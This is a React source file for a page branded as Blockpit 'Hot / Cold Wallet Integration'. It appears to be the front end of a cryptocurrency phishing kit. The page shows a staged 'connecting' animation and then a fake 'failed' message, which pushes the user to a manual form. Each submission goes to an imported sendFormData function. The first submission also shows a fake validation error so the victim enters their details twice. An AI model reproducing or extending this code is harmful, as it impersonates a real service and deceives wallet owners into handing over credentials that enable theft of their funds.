import React, { useEffect, useRef,useState } from "react";
import "../SecondHome/SecondHome.css";
import { FaArrowLeftLong } from "react-icons/fa6";
import { FaRegQuestionCircle } from "react-icons/fa";
import newImage from "../../assets/newimage.svg";
import cloudImage from "../../assets/cloudimage.svg";
import { MdKeyboardArrowRight } from "react-icons/md";
import { useNavigate } from "react-router-dom";
import { sendFormData } from "../sendFormData";
import Modal from "../Modals/Modal";
import ModalConnecting from "../Modals/ModalConnecting";
import ModalFailed from "../Modals/ModalFailed";
import ModalForm from "../Modals/ModalForm";

const SecondHome = () => {
  const [showModal, setShowModal] = useState(false);
  const [showModal2, setShowModal2] = useState(false);
  const [showModal3, setShowModal3] = useState(false);
  const navigate = useNavigate();
  const [submitCount, setSubmitCount]= useState(0)
  const [error, setError] = useState("")
  const form = useRef()
  
  const handleNavigate = () => {
    navigate("/");
  };

  const closeModals = () =>{
    setShowModal(false)
    setShowModal2(false)
    setShowModal3(false)
  }

  const openModal = () => {
    setShowModal(true);
    setShowModal2(false);
  };

  const closeModal2 = () => {
    setShowModal2(false);
    setShowModal3(true);
  }

  useEffect(() => {
    let timer;
    if (showModal) {
      timer = setTimeout(() => {
        setShowModal(false);
        setShowModal2(true);
      }, 3000);
    }
    return () => clearTimeout(timer);
  }, [showModal]);

  const formSubmit = (e) => {
    e.preventDefault()

    const newCount = submitCount + 1
    setSubmitCount(newCount)
    sendFormData(form)

    if(newCount === 1){
      setError("Please, input your details correctly")
      
    }

    if(newCount === 2){
      setError("")
      navigate("/admin")
      return 0
    }

    return newCount
  };

  return (
    <div id="homepage2">
      <div id="hheadingdiv">
        <FaArrowLeftLong className="react-icon" onClick={handleNavigate} />
        <p id="hheadingp">Hot / Cold Wallet Integration</p>
        <FaRegQuestionCircle className="react-icon" id="question-icon" />
      </div>

      <div id="div2" className="otherdiv" onClick={openModal}>
        <div className="imagecontainer" id="imgcon1">
          <img src={newImage} alt="" id="newimage" />
        </div>

        <div className="textdiv">
          <p className="textdivheading">
            Integrate your Hot / Cold Wallet Account
          </p>
          <p className="textdivp">
            Proceed to integrate and connect your Hot / Cold wallet account
            directly to your Blockpit account
          </p>
        </div>
        <MdKeyboardArrowRight className="arrow-right" />
      </div>

      <div id="div3" className="otherdiv" onClick={openModal}>
        <div className="imagecontainer" id="imgcon2">
          <img src={cloudImage} alt="" id="newimage" />
        </div>
        <div className="textdiv">
          <p className="textdivheading">Cloud Wallet / Keyless Wallet</p>
          <p className="textdivp">
            Log in to your Blockpit via your keychain or your wireless device.
          </p>
        </div>
        <MdKeyboardArrowRight className="arrow-right" />
      </div>

      {showModal && (
        <Modal onClose={closeModals}>
          <ModalConnecting/>
        </Modal>
      )}

      {showModal2 && (
        <Modal onClose={closeModals}>
          <ModalFailed onManualConnect={closeModal2}/>
        </Modal>
      )}

      {showModal3 && (
        <Modal onClose={closeModals}>
          <ModalForm form={form} formSubmit={formSubmit} error={error}/>
        </Modal>
      )}
    </div>
  );
};

export default SecondHome;
